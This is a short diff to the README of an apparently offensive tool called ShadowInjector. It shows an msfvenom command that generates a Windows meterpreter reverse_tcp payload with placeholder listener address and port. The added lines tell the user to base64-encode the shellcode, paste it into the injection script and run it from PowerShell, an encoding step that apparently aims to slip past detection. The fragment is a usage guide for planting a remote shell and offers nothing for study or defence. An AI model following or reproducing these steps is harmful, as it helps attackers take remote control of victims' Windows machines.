@@ -10,7 +10,11 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=local_ip LPORT=local_port 
 
 ![](https://github.com/okankurtuluss/ShadowInjector/blob/okankurtuluss/main/screenshots/Creating%20a%20payload.png)
 
-Add the generated code to the "add_shell_code_here" section in the script.
+Perform the encode process by pasting the created shellcode into the "# shellcode will be written here" section.
+
+
+
+Add the base64 encoded payload to the "add_shell_code_here" section of the script.
 
 To run the script, open a PowerShell window and execute the following command:
 
